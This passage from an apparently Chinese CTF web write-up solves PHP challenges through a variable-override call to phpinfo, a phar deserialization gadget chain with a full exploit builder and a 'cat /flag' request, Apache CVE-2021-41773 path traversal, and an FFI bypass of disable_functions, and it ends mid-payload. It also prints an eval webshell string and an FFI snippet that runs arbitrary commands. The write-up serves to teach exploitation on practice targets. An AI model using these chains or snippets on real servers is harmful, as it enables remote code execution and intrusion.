class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;total&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;join&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;on&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;action&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;return&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;sbpage&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;urlrule&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;pagesize&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;pagefile&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>       ];<br><br>       <span class="hljs-variable">$param</span> = <span class="hljs-variable">$where</span> = [];<br><br>       <span class="hljs-variable">$_params</span> = trim(<span class="hljs-variable">$_params</span>);<span class="hljs-comment">//去除头尾的空白符</span><br><br>       <span class="hljs-variable">$params</span> = explode(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-variable">$_params</span>);<br>       <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>], [<span class="hljs-string">&#x27;list&#x27;</span>,<span class="hljs-string">&#x27;function&#x27;</span>])) &#123;<br>           <span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;action=&#x27;</span>.<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>];<br>       &#125;<br>       <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$t</span>) &#123;<br>           <span class="hljs-variable">$var</span> = substr(<span class="hljs-variable">$t</span>, <span class="hljs-number">0</span>, strpos(<span class="hljs-variable">$t</span>, <span class="hljs-string">&#x27;=&#x27;</span>));<br>           <span class="hljs-variable">$val</span> = substr(<span class="hljs-variable">$t</span>, strpos(<span class="hljs-variable">$t</span>, <span class="hljs-string">&#x27;=&#x27;</span>) + <span class="hljs-number">1</span>);<br>           <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$var</span>) &#123;<br>               <span class="hljs-keyword">continue</span>;<br>           &#125;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>])) &#123; <br>               <span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>;   <span class="hljs-comment">//实现系统变量覆盖，覆盖action</span><br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-variable">$param</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>;    <span class="hljs-comment">//存放自己设置的变量</span><br>           &#125;<br>       &#125;<br>       <span class="hljs-comment">// action</span><br>       <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &#123;<br>           <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;function&#x27;</span>:<br>               <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                   <span class="hljs-keyword">return</span>  <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>               &#125; <span class="hljs-keyword">elseif</span> (!function_exists(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                   <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>               &#125;<br><br>               <span class="hljs-variable">$force</span> = <span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;force&#x27;</span>];<br>               <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$force</span>) &#123;<br>                   <span class="hljs-variable">$p</span> = [];<span class="hljs-comment">//获取用户设置的变量</span><br>                   <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$param</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span> =&gt; <span class="hljs-variable">$t</span>) &#123;<br>                       <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$var</span>, <span class="hljs-string">&#x27;param&#x27;</span>) === <span class="hljs-number">0</span>) &#123;<br>                           <span class="hljs-variable">$n</span> = intval(substr(<span class="hljs-variable">$var</span>, <span class="hljs-number">5</span>));<br>                           <span class="hljs-variable">$p</span>[<span class="hljs-variable">$n</span>] = <span class="hljs-variable">$t</span>;<br>                       &#125;<br>                   &#125;<br>                   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span>) &#123;<br>                       <span class="hljs-variable">$rt</span> = call_user_func_array(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$p</span>);<br>                   &#125; <span class="hljs-keyword">else</span> &#123;<br>                       <span class="hljs-variable">$rt</span> = call_user_func(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);   <span class="hljs-comment">//rce入口</span><br>                   &#125;<br>                   <span class="hljs-keyword">return</span> <span class="hljs-variable">$rt</span>;<br>               &#125;<span class="hljs-keyword">else</span>&#123;<br>                   <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>               &#125;<br>           <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;list&#x27;</span>:<br>               <span class="hljs-keyword">return</span> json_encode(<span class="hljs-keyword">$this</span>-&gt;date);<br>       &#125;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><p>显然此时我们有实现命令执行，首先需要覆盖掉函数参数中自带的<code>action=list</code>，于是我们构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?space=admin&amp;mod=whatever action=<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>=<span class="hljs-title">phpinfo</span></span><br></code></pre></td></tr></table></figure><p>重要的位置我已经加上了注释，在代码执行中，我们成功将<code>system['action']</code>修改为了function，调用phpinfo是因为flag藏在其中（这里也是需要一些运气和经验的），如果我出的话，应该还是会实现rce吧。</p><h2 id="反序列化">7、反序列化</h2><h3 id="安询杯easy_serialize_php字符串逃逸">1、安询杯—easy_serialize_php（字符串逃逸）</h3><h3 id="swpu2021babyunser">2、SWPU2021——babyunser</h3><p>这道题前面大概就是文件上传，在查看界面存在文件包含漏洞，可以直接扒下全部源码。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230331231210292.png" alt="image-20230331231210292" /></p><p>源码一看，发现不让使用常见的伪协议，但是留下了phar协议，而且读取文件内容也非常像是利用phar反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-string">&#x27;aa&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name=strtolower(<span class="hljs-keyword">$this</span>-&gt;name);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ff</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;content=<span class="hljs-string">&quot;\&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$key</span>-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;func&#125;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zz</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;surprise&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;filename=<span class="hljs-variable">$filename</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;filename))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;这不合理&#x27;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123;<br>        <span class="hljs-variable">$filename</span>=<span class="hljs-keyword">$this</span>-&gt;filename;<br>        <span class="hljs-variable">$lt</span>=<span class="hljs-keyword">$this</span>-&gt;filename-&gt;<span class="hljs-variable">$var</span>;<br>        <span class="hljs-comment">//此功能废弃，不想写了</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFile</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;filter();<br>        <span class="hljs-variable">$contents</span>=file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$contents</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;404 not found&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>]&#125;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;content;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-string">&#x27;eval&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;arg=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;<br>        <span class="hljs-variable">$name</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// aa::_destruct -&gt; zz::__toString -&gt; zz::write -&gt; ff::__get -&gt; zz::__call</span><br></code></pre></td></tr></table></figure><p>经过分析，利用链大概如下，对部分内容做说明</p><ol type="1"><li>链到zz后，此时可以调用write，var可以设置为content，令filename为ff，这样才能触发__get。此时的var虽然是字符串"content"，但是在PHP中仍然处理为属性content</li><li>调用__get后，传入的参数$key就是ff中的私有属性$content</li><li>ff -&gt; $content设置为zz，由于zz中不存在system的方法，因此触发了__call，传入的参数$name为调用的函数名称，参数就是外部调用的参数（此时为数组形式）</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> aa::_destruct -&gt; zz::__toString -&gt; zz::write -&gt; ff::__get -&gt; zz::__call<br><span class="hljs-regexp">//</span>                  method=write                   cmd = ls<br><span class="hljs-regexp">//</span>                  var = content   <span class="hljs-keyword">func</span> = system<br></code></pre></td></tr></table></figure><p>最后是构造phar文件，然后利用phar文件触发反序列化实现rce。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ff</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-variable">$content</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zz</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;surprise&#x27;</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span></span>&#123;<br>    &#125;<br><br><span class="hljs-comment">// aa::_destruct -&gt; zz::__toString -&gt; zz::write -&gt; ff::__get -&gt; zz::__call</span><br><span class="hljs-comment">//                  method=write                   cmd = ls</span><br><span class="hljs-comment">//                  var = content</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> xx();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> ff(<span class="hljs-variable">$a</span>); <span class="hljs-variable">$b</span>-&gt;func = <span class="hljs-string">&quot;system&quot;</span>;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> zz(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> aa(<span class="hljs-variable">$c</span>);<br><br>    <span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> phar(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();<br>    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$d</span>);<span class="hljs-comment">//自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;flag&quot;</span>);<span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br></code></pre></td></tr></table></figure><p>最后在read.php下利用phar协议完成攻击</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">file</span>=phar://upload/b<span class="hljs-number">80</span>f<span class="hljs-number">81</span>d<span class="hljs-number">26</span>bc<span class="hljs-number">22</span>a<span class="hljs-number">2148</span>aacf<span class="hljs-number">1</span>e<span class="hljs-number">5</span>ff<span class="hljs-number">1</span>dbce.txt&amp;method=write&amp;var=content&amp;cmd=cat /flag<br></code></pre></td></tr></table></figure><h2 id="中间件">8、中间件</h2><h3 id="nssez_rcecve-2021-41773">1、NSS—ez_rce（CVE-2021-41773）</h3><p>打开网页，啥都没有，抓个包发现headers里也没有信息，只能扫一下目录，看看有没有源码/后台/api泄露。</p><p>如果再没有，看看服务器中间件等等有无一些新出的CVE。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205451649.png" alt="image-20220819205451649" /></p><p>看到/cgi-bin，想到之前apache出的cve，检查一下apache的版本2.4.49，基本确定是路径穿越的CVE。</p><p>于是使用rce的payload：</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205728808.png" alt="image-20220819205728808" /></p><p>利用grep找到flag</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205821071.png" alt="image-20220819205821071" /></p><h2 id="php扩展">9、PHP扩展</h2><h3 id="rctf-nextphpffi">1、RCTF-nextphp（FFI）</h3><p>这道题的代码还是非常简单，单刀直入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>查看phpinfo之后发现经典的disable_function</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923152627815.png" alt="image-20220923152627815" /></p><p>蚁剑连接之后，发现没法上传文件，LD_PRELOAD的利用失败了。</p><p>发现同目录下存在preload.php，并且该文件可编辑，也被index.php包含了</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161449908.png" alt="image-20220923161449908" /></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$data</span> = [<br>            <span class="hljs-string">&#x27;ret&#x27;</span> =&gt; <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&#x27;func&#x27;</span> =&gt; <span class="hljs-string">&#x27;FFI::cdef&#x27;</span>,<br>            <span class="hljs-string">&#x27;arg&#x27;</span> =&gt; <span class="hljs-string">&#x27;int system(char *command);&#x27;</span><br>        ];<br><br>        <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span> (<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-string">&#x27;ret&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-string">&#x27;func&#x27;</span>](<span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-string">&#x27;arg&#x27;</span>]);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__serialize</span>(<span class="hljs-params"></span>): <span class="hljs-title">array</span> </span>&#123;<br>             <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>) </span>&#123;<br>            array_merge(<span class="hljs-keyword">$this</span>-&gt;data, <span class="hljs-variable">$data</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;run();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span> (<span class="hljs-params"></span>): <span class="hljs-title">string</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> serialize(<span class="hljs-keyword">$this</span>-&gt;data);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$payload</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;data = unserialize(<span class="hljs-variable">$payload</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;run();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>看起来我们的攻击点在run函数，如何利用run函数是一个问题</p><p>这里就引到了PHP的FFI扩展，简单来说就是在PHP中引入C语言的这样一种机制，那么我们就可以利用C语言标准库里的system来绕过disable_function。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br>    <span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span> &gt; /tmp/SD&quot;</span>);       <span class="hljs-comment">//由GET传参的任意代码执行</span><br>    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/tmp/SD&quot;</span>);<br>    @unlink(<span class="hljs-string">&quot;/tmp/SD&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上面就是FFI实现RCE攻击的基础代码，当然我们要根据我们的情况进行修改。</p><p>这里主要是两个问题</p><ol type="1"><li>如何构造反序列化链</li><li>如何获取到被赋值的data['ret']</li></ol><p>首先，我们注意到存在两个序列化函数，两者是不同的。</p><ol type="1"><li>__serialize()会先于serialize被调用，最后返回的是数组的序列化结果。</li><li>serialize()返回的是class A的序列化结果。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ret&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;FFI::cdef&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;arg&quot;</span>;s:<span class="hljs-number">26</span>:<span class="hljs-string">&quot;int system(char *command);&quot;</span>;&#125;<br><span class="hljs-comment">//注意两者的区别</span><br>C:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">89</span>:&#123;a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ret&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;FFI::cdef&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;arg&quot;</span>;s:<span 